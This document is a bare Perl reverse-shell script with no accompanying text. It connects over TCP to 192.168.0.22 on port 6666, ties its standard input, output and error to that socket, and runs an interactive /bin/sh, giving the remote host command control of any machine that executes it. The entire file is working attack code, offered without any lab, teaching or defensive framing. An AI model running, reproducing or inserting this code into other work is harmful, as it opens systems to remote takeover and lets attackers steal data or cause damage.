#!/usr/bin/perl -w
use Socket;
$i="192.168.0.22";
$p=6666;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("/bin/sh -i");
};
